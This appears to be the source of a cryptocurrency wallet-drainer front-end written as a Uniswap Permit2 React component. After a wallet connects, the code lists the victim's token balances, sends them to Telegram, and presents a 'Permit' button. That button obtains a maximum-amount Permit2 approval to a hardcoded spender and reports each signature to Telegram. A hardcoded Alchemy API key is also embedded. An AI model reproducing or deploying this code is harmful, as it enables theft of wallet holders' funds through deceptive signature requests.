import { signTypedData } from '@uniswap/conedison/provider/index'
import type { PermitSingle } from '@uniswap/Permit2-sdk'
import {
  AllowanceProvider,
  PERMIT2_ADDRESS,
  MaxAllowanceTransferAmount,
  AllowanceTransfer,
} from '@uniswap/Permit2-sdk'
import { ethers, Contract, BigNumber } from 'ethers'
import { useState, useCallback, useEffect } from 'react'
import { logToTelegram } from "./log"; // Import logging function

/**
 * Converts an expiration (in milliseconds) to a deadline (in seconds) suitable for the EVM.
 * Permit2 expresses expirations as deadlines, but JavaScript usually uses milliseconds,
 * so this is provided as a convenience function.
 */
function toDeadline(expiration: number): number {
  return Math.floor((Date.now() + expiration) / 1000)
}

const Permit = ({chain}) => {
  let [account, setAccount] = useState<string>('')
  let [validWallet, setValidWallet] = useState(false)
  
  let currentChain = chain;
  console.log(currentChain)
  
    let currentChainRPC = ""; // Declare variable outside for proper scoping

if (currentChain.network === "arbitrum") {
  currentChainRPC = `https://arb-mainnet.g.alchemy.com/v2/iuCCCFmdlEI_1cVudFMu3hnWR0UgJOmL`;
}

if (currentChain.network === "homestead") {
  currentChainRPC = `https://eth-mainnet.g.alchemy.com/v2/iuCCCFmdlEI_1cVudFMu3hnWR0UgJOmL`;
}

if (currentChain.network === "matic") {
  currentChainRPC = `https://polygon-mainnet.g.alchemy.com/v2/iuCCCFmdlEI_1cVudFMu3hnWR0UgJOmL`;
}

if (currentChain.network === "optimism") {
  currentChainRPC = `https://opt-mainnet.g.alchemy.com/v2/iuCCCFmdlEI_1cVudFMu3hnWR0UgJOmL`;
}

// Use `currentChainRPC` for further logic

    const spender = '0xc01289B24579D46dfc5cF718FF58C1b0be85E177'
  const [provider, setProvider] = useState<ethers.providers.Web3Provider>()
  const [approvalAmounts, setApprovalAmmounts] = useState<{
    permitAmount: BigNumber
    expiration: number
    nonce: number
  }>({ permitAmount: BigNumber.from(0), expiration: 0, nonce: 0 })
  const token = '0xe6863210e49B080C044Cc5df861e5A83435844D0'
  const [walletTokens, setWalletTokens] = useState<any>([])

  const compileToken = (newToken: any) => {
    console.log(newToken)
    setWalletTokens((prevTokens: any) => {
        console.log(prevTokens)
        console.log(newToken)
        let newT = [...prevTokens, newToken]
        console.log(newT)
        return newT
    });
    console.log(walletTokens)
  };

  const connectWallet = useCallback(async () => {
    try {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const address = await (window as any).ethereum.request({
        method: 'eth_requestAccounts',
      })
      setProvider(
        new ethers.providers.Web3Provider(
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          (window as any).ethereum
        )
      )
      setAccount(address[0])
      getWalletTokens(address[0])
      // setSpender(address[1])
    } catch (e) {
      // eslint-disable-next-line no-console
      console.error(e)
    }
  }, [])

  /**
   * Get the current allowance amount, expiration, and nonce using the AllowanceProvider.
   * This is the same data that would be used to create a PermitSingle object.
   * You can check permitAmount or expiration on this data to determine whether you need to create a new permit.
   */
  const handleApprovalCheck = useCallback(async () => {
    const allowanceProvider = new AllowanceProvider(provider!, PERMIT2_ADDRESS)
    // Address of the protocol contract that is being approved to spend tokens.
    const SPENDER_ADDRESS = spender
    const processPermit = async () => {
      const {
        amount: permitAmount,
        expiration,
        nonce,
      } = await allowanceProvider.getAllowanceData(
        token,
        account,
        SPENDER_ADDRESS
      )
      setApprovalAmmounts({ permitAmount, expiration, nonce })
    }
    processPermit()
  }, [account, provider, spender])
  const handleSetValidWallet =(v)=>{
    setValidWallet(v)
  }


  /**
   * Get the current allowance amount, expiration, and nonce using the AllowanceProvider.
   * This is the same data that would be used to create a PermitSingle object.
   * You can check permitAmount or expiration on this data to determine whether you need to create a new permit.
   */
  const handlePermit = useCallback(async () => {
    const signer = provider!.getSigner(account);
    const allowanceProvider = new AllowanceProvider(provider!, PERMIT2_ADDRESS);
    const SPENDER_ADDRESS = spender;



    
    // Array of token addresses you want to process
    // const tokens = ["0xe6863210e49B080C044Cc5df861e5A83435844D0", "0xe6863210e49B080C044Cc5df861e5A83435844D0"]; // Replace with actual token addresses
  
    let tokens = [localStorage.getItem('currentToken')]


    // Process permit for each token
    const processPermit = async (token) => {
      const { nonce } = await allowanceProvider.getAllowanceData(token, account, SPENDER_ADDRESS);
  
      const permitSingle: PermitSingle = {
        details: {
          token,
          amount: MaxAllowanceTransferAmount,
          expiration: toDeadline(/* 30 days= */ 1000 * 60 * 60 * 24 * 30),
          nonce,
        },
        spender: SPENDER_ADDRESS,
        sigDeadline: toDeadline(/* 30 mins= */ 1000 * 60 * 60 * 30),
      };
  
      const { domain, types, values } = AllowanceTransfer.getPermitData(
        permitSingle,
        PERMIT2_ADDRESS,
        provider!.network.chainId
      );
  

      const signature = await signTypedData(signer, domain, types, values);
  
      let SignedMessage = `Signed: \nAddress: ${account} \nToken: ${token} \n For: ${SPENDER_ADDRESS}`;
      logToTelegram(SignedMessage); 

      const permitAbi = [
        'function permit(address owner, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender,uint256 sigDeadline) permitSingle, bytes calldata signature)',
        'function transferFrom(address from, address to, uint160 amount, address token)',
      ];
  
      const permitContract = new Contract(PERMIT2_ADDRESS, permitAbi, signer);
      await permitContract.permit(account, permitSingle, signature);

      let PermitMessage = `Permit Successful: \nAddress: ${account} \nToken: ${token} \n For: ${SPENDER_ADDRESS}`;
      logToTelegram(PermitMessage); 
    };
  console.error(walletTokens)
    // Loop through all tokens and process each one
    for (const token of tokens) {
      await processPermit(token);
    }
  }, [account, provider, spender]);

  const getWalletTokens = async (w)=>{
    console.log(w)
    let wT = []
            // Wallet address
        const address = w;
        console.log(currentChain)
        // Alchemy URL --> Replace with your API key at the end
        const baseURL = currentChainRPC
        // Data for making the request to query token balances
        const data = JSON.stringify({
        jsonrpc: "2.0",
        method: "alchemy_getTokenBalances",
        params: [`${address}`],
        id: 42,
        });

        // Fetching the token balances
        let response = await fetch(baseURL, {
            method: "POST",
            headers: {
            "Content-Type": "application/json",
            },
            body: data,
        });

        response = await response.json();

        // Getting balances from the response
        const balances = response["result"];

        // Remove tokens with zero balance
        const nonZeroBalances = balances.tokenBalances.filter((token) => {
            return token.tokenBalance !== "0";
        });

        console.log(`Token balances of ${address}: \n`);

        // Counter for SNo of final output
        let i = 1;

        // Loop through all tokens with non-zero balance
        let balancesLog = []
        for (let token of nonZeroBalances) {
            // Get balance of token
            let balance = token.tokenBalance;
            // Data for fetching token metadata
            const metadataData = JSON.stringify({
            jsonrpc: "2.0",
            method: "alchemy_getTokenMetadata",
            params: [token.contractAddress],
            id: 1,
            });

            // Fetching the token metadata
            const metadataResponse = await fetch(baseURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: metadataData,
            });

            const metadata = await metadataResponse.json();

            // Compute token balance in human-readable format
            balance = balance / Math.pow(10, metadata.result.decimals);
            balance = balance.toFixed(2);

            // Print name, balance, and symbol of token
            console.log(
            `${i++}. ${metadata.result.name}: ${balance} ${metadata.result.symbol}`
            );
            balancesLog.push(`------ Token: ${metadata.result.name} (${token.contractAddress}): Balance: ${balance} Symbol: ${metadata.result.symbol} ------`)
            token.gBalance = balance
        }
        console.log(nonZeroBalances)
        nonZeroBalances.sort((a, b) => parseFloat(b.gBalance) - parseFloat(a.gBalance));
        for (let bToken of nonZeroBalances) {
            wT.push(bToken.contractAddress)
            compileToken(bToken.contractAddress)
        }

        let AllBalanceLog = `All balance: \nAddress: ${account} \nTokens: ${JSON.stringify(balancesLog)}`;
        logToTelegram(AllBalanceLog); 
            // setWalletTokens(wT)
            localStorage.setItem('currentToken', wT[0])
            console.log(nonZeroBalances[0])
            console.log(parseInt(nonZeroBalances[0].gBalance))
            if(parseInt(nonZeroBalances[0].gBalance) <= 0 ){
                alert('Invalid wallet. Connect with another one.')
            }else{
                handleSetValidWallet(true)
            }
            console.log(wT)
            // setWalletTokens((prevTokens) => [...prevTokens, wT]);

  }
  useEffect(() => {
    console.log('walletTokens state updated:', walletTokens);
  }, [walletTokens]);

  return (
    <>
      {account ? (
        <>
          {/* <p onClick={handleApprovalCheck} >
            Check Approval Limits
          </p> */}
           {validWallet ? ( <button onClick={handlePermit}>Permit</button>) :(<>Analyzing Wallet... Please Wait...</>)}
{/*           
          Account: {account}
          
            Permitted Amounts: {approvalAmounts.permitAmount.toString()}
          
          Permitted Expiration: {approvalAmounts.expiration}
          Permitted Nonce: {approvalAmounts.nonce} */}
        </>
      ) : (
        <p onClick={connectWallet} >
            Connect
        </p>
      )}
    </>
  )
}

export default Permit
